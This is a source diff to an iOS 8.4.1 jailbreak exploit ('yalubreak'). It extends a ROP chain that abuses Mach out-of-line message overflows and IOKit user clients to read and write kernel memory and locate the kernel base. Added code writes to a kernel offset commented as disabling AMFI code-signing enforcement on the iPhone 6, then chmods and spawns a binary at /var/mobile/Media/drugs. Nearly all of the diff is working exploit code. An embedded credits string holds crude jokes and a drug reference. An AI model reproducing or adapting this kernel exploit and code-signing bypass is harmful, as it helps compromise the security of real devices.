@@ -509,8 +509,8 @@ int main(int argc, const char * argv[]) {
     
     load_cmd_seg.vmaddr = 0x51000000;
     load_cmd_seg.fileoff = fsz;
-    load_cmd_seg.filesize = 0x500000;
-    load_cmd_seg.vmsize = 0x500000;
+    load_cmd_seg.filesize = 0x200000;
+    load_cmd_seg.vmsize = 0x200000;
     strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
@@ -970,6 +970,7 @@ StoreR0(push, where)
         int _IOServiceWaitQuiet;
         int _host_get_io_master;
         int _io_connect_method_scalarI_structureI;
+        int _io_connect_add_client;
         int copyaddr;
         int readaddr;
         char structData[2048];
@@ -1007,9 +1008,13 @@ StoreR0(push, where)
         uint64_t vptr;
         uint64_t kern_slide;
         uint64_t kern_text_base;
+        uint64_t ktmp;
         char mscratch[8192];
         char scratch[8192];
+        char kvt[8192];
         mach_timespec_t waitTime;
+        char* spawnp[2];
+        char spawnpath[256];
     } args_t;
     
     args_t args_s;
@@ -1022,9 +1027,11 @@ StoreR0(push, where)
 #define SEG_VAR(var) ((char*)(&(args_seg->var)))
 #define SEG_VAR_(var, i) ((uint32_t)(&((args_seg->var)[i])))
     
+    
     argss->waitTime.tv_sec = 10;
     argss->waitTime.tv_nsec = 10000000;
     
+    argss->_io_connect_add_client = IOKIT_io_connect_add_client - _DYCACHE_BASE + 1;
     argss->_io_service_get_matching_service = IOKIT_io_service_get_matching_service - _DYCACHE_BASE + 1;
     argss->_io_connect_method_scalarI_structureI = IOKIT_io_connect_method_scalarI_structureI - _DYCACHE_BASE + 1;
     argss->_IOServiceOpen = IOKIT_IOServiceOpen - _DYCACHE_BASE + 1;
@@ -1051,7 +1058,7 @@ StoreR0(push, where)
     *stack++ = 0x44444444;
     *stack++ = m_m_scratch;
     
-    strcpy(argss->initmsg, "yalubreak iso841 - Kim Jong Cracks Research\nCredits:\nqwertyoruiop - sb escape & codesign bypass & initial kernel exploit\npanguteam: kernel vulns\nwindknown: kernel exploit & knows it's stuff\n_Morpheus_: this guy knows stuff\njk9356: kim jong cracks anthem\nJonSeals: crack rocks supply (w/ Frank & haifisch)\nih8sn0w: <3\nposixninja: <3\nxerub <3\nits_not_herpes because thanks god it wasnt herpes\neric fuck off\nKim Jong Un for being Dear Leader.\nRIP TTWJ / PYTECH / DISSIDENT\nSHOUT OUT @ ALL THE OLD GANGSTAS STILL IN THE JB SCENE\nHEROIN IS THE MEANING OF LIFE\n\nBRITTA ROLL UP [no its not pythech!] \n[i] iomasterport: 0x%08x / gasgauge user client: 0x%08x\n");
+    strcpy(argss->initmsg, "yalubreak iso841 - Kim Jong Cracks Research\nCredits:\nqwertyoruiop - sb escape & codesign bypass & initial kernel exploit\npanguteam: kernel vulns\nwindknown: kernel exploit & knows it's stuff\n_Morpheus_: this guy knows stuff\njk9356: kim jong cracks anthem\nJonSeals: crack rocks supply (w/ Frank & haifisch)\nih8sn0w: <3\nposixninja: <3\nxerub <3\nits_not_herpes because thanks god it wasnt herpes\neric fuck off\nKim Jong Un for being Dear Leader.\nRIP TTWJ / PYTECH / DISSIDENT\nSHOUT OUT @ ALL THE OLD GANGSTAS STILL IN THE JB SCENE\nHEROIN IS THE MEANING OF LIFE\n\nBRITTA ROLL UP [no its not pythech!] \n[i] iomasterport: 0x%08x / gasgauge user client: 0x%08x\njk++\n");
     
     strcpy(argss->gasgauge_match, "<dict><key>IOProviderClass</key><string>AppleHDQGasGaugeControl</string></dict>");
     strcpy(argss->rootdomainuserclient_match, "<dict><key>IOProviderClass</key><string>IOPMrootDomain</string></dict>");
@@ -1064,6 +1071,9 @@ StoreR0(push, where)
     
     RopFixupLR(PUSH);
     RopCallFunction2(PUSH, @"___syscall", 294, SEG_VAR(cache_slide));
+    RopCallFunction1(PUSH, @"___syscall", SYS_sync);
+    
+    
     RopCallFunction3(PUSH, @"_open", SEG_VAR(a), O_RDWR|O_CREAT|O_APPEND, 0666);
     StoreR0(PUSH, SEG_VAR(fd1));
     RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT|O_TRUNC, 0666);
@@ -1071,12 +1081,15 @@ StoreR0(push, where)
     RopCallFunction3(PUSH, @"_open", SEG_VAR(c), O_RDWR|O_CREAT|O_TRUNC, 0666);
     StoreR0(PUSH, SEG_VAR(fd3));
     
+    RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_add_client), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceOpen), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceWaitQuiet), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceClose), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_io_service_get_matching_service), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_host_get_io_master), SEG_VAR(cache_slide));
+
+    
 
     RopCallFunction0(PUSH, @"_task_self_trap");
     StoreR0(PUSH, SEG_VAR(mach_task_self));
@@ -1255,13 +1268,14 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
     RecvMsg(PUSH, 480, oflow_msg); // hang
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
     
+    assert(stacky > stack);
     stack = (uint32_t*)stacky;
     segstackbase = (uint32_t)segstackybase;
     stackbase = (uint32_t*)stack;
     PUSH = 0x44444444; // R4
     PUSH = m_m_scratch; // R7
     
-    for (int i = 450; i < 500; i++) {
+    for (int i = 400; i < 500; i++) {
         if (i != 480) {
             WriteWhatWhere(PUSH, 0, SEG_VAR(oflow_msg.desc.address));
             RecvMsg(PUSH, i, oflow_msg);
@@ -1375,6 +1389,8 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
     RecvMsg(PUSH, 480, oflow_msg); // hang
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
     
+    assert(stackz > stack);
+
     stack = (uint32_t*)stackz;
     segstackbase = (uint32_t)segstackzbase;
     stackbase = (uint32_t*)stack;
@@ -1391,7 +1407,7 @@ SendMsg(PUSH, overlap_port, oolmsg_template_2048);
     
 #define ReadWriteScratchOverlap() \
 RecvMsg(PUSH, overlap_port, tmp_msg);\
-WriteWhatWhere(PUSH, SEG_VAR(scratch), SEG_VAR(oolmsg_template_2048.desc.address));\
+WriteWhatWhere(PUSH, SEG_VAR(scratch[0]), SEG_VAR(oolmsg_template_2048.desc.address));\
 SendMsg(PUSH, overlap_port, oolmsg_template_2048);
     
     
@@ -1491,7 +1507,12 @@ step(i);\
     
     ReadWriteOverlapped512();
     RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
-    
+    for (int i = 0; i < (4096); i+=4) {
+        LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
+        RopAddR0(PUSH, i);
+        DerefR0(PUSH);
+        StoreR0(PUSH, SEG_VAR(kvt[i]));
+    }
     LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
     RopAddR0(PUSH, 0x18);
     DerefR0(PUSH);
@@ -1537,37 +1558,110 @@ step(i);\
     
     LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 4);
     RopAddR0(PUSH, 0xffffff80);
-    StoreR0(PUSH, SEG_VAR(kern_text_base)+4);
+    StoreR0(PUSH, SEG_VAR(kern_text_base) + 4);
     
     [dy setSlide:dy.slide+1]; // enter thumb
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     
-#define dump_step 0
-    for (int i = dump_step*0x60; i < (1+dump_step)*0x60; i++) {
+    // disable amfi on iOS 8.4.1 iPhone 6: write 1 at +0x65d290 from kernel text base
+    
+#define __ARM64_ 1
+#if 0
+    for (int i = 0; i < 20; i++) {
         ReadWriteOverlap();
         tmptoscratch();
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
-        RopAddR0(PUSH, i*0x1000);
+        RopAddR0(PUSH, i*4096*8*2);
         StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
         StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
-        WriteWhatWhere(PUSH, 4096, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
+        WriteWhatWhere(PUSH, 4096*8*2, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
         ReadWriteScratchOverlap();
         
         ReadWriteOverlapped512();
-        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd3), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
+        
+        RopCallFunction9Deref1(PUSH, @"__platform_memmove", 1, SEG_VAR(tmp_msg.desc.address), 0x54000000+i*4096*8*2, 0, 4096*8*2, 0, 0, 0, 0, 0, 0);
+    }
+#endif
+    
+    
+    RecvMsg(PUSH, overlapped_port, tmp_msg);
+    [dy setSlide:dy.slide+1]; // enter thumb
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceOpen), 0, SEG_VAR(svc), 1, SEG_VAR(mach_task_self), 0, 0, 0, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0,0);
+    [dy setSlide:dy.slide-1]; // exit thumb
+
+    ReadWriteOverlap();
+    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
+
+
+    for (int i = 0; i < 2048; i += 4) {
+        LoadIntoR0(PUSH, SEG_VAR(kvt[i]));
+        StoreR0(PUSH, SEG_VAR(scratch[i]));
+    }
+
+    for (int i = 0; i < 256; i += 4) {
+        step(i);
     }
     
+    for (int i = 0; i < 512; i += 4) {
+        LoadIntoR0(PUSH, SEG_VAR(scratch[1024-0x58+i]));
+        StoreR0(PUSH, SEG_VAR(scratch[4096+i]));
+    }
     
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
+    LoadIntoR0(PUSH, SEG_VAR(scratch[1024-0x58]));
+    StoreR0(PUSH, SEG_VAR(ktmp));
+    LoadIntoR0(PUSH, SEG_VAR(scratch[1024-0x58+4]));
+    StoreR0(PUSH, SEG_VAR(ktmp)+4);
+
+    LoadIntoR0(PUSH, SEG_VAR(kern_alloc_1024));
+    RopAddR0(PUSH, -(1024));
+    RopAddR0(PUSH, 0x58);
+    StoreR0(PUSH, SEG_VAR(scratch[1024-0x58]));
     
-    ReadWriteOverlap();
-    tmptoscratch();
-    WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[1024 - 0x58 + 0x20])); // make sure this does not get free'd
+    LoadIntoR0(PUSH, SEG_VAR(kern_alloc_1024)+4);
+    StoreR0(PUSH, SEG_VAR(scratch[1024-0x58+4]));
+    
+    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_write, 0, SEG_VAR(scratch[0]), 2048, 0, 0, 0, 0, 0);
+
+
+    
+    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)); // where
+    RopAddR0(PUSH, (0x65d290-0xA0));
+    StoreR0(PUSH, SEG_VAR(scratch[0x10 + 1024-0x58]));
+    
+    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
+    StoreR0(PUSH, SEG_VAR(scratch[0x10 + 4 + 1024-0x58]));
+    
+    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)); // gadget
+    RopAddR0(PUSH, (0xb162e0));
+    StoreR0(PUSH, SEG_VAR(scratch[0x28]));
+
     ReadWriteScratchOverlap();
+    
+    [dy setSlide:dy.slide+1]; // enter thumb
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_connect_add_client), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
+    [dy setSlide:dy.slide-1]; // exit thumb
+    for (int i = 0; i < 512; i += 4) {
+        LoadIntoR0(PUSH, SEG_VAR(scratch[4096+i]));
+        StoreR0(PUSH, SEG_VAR(scratch[1024-0x58+i]));
+    }
+
+    ReadWriteScratchOverlap();
+
+    RecvMsg(PUSH, 300, tmp_msg);
+    RecvMsg(PUSH, 300, tmp_msg);
+    RecvMsg(PUSH, 300, tmp_msg);
+    
+
+    strcpy(argss->spawnpath, "/var/mobile/Media/drugs");
+    argss->spawnp[0] = SEG_VAR(spawnpath);
+    argss->spawnp[1] = 0;
+
+    RopCallFunction3(PUSH, @"___syscall", SYS_chmod, SEG_VAR(spawnpath), 0755);
+
+    RopCallFunction7(PUSH, @"___syscall", SYS_posix_spawn, m_m_scratch, SEG_VAR(spawnpath), 0, 0, SEG_VAR(spawnp), 0);
 
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
@@ -1575,7 +1669,13 @@ step(i);\
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
+    RecvMsg(PUSH, 300, tmp_msg);
+    RecvMsg(PUSH, 300, tmp_msg);
+    RecvMsg(PUSH, 300, tmp_msg);
+    RecvMsg(PUSH, 300, tmp_msg);
     
+    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
+    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
 
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
     
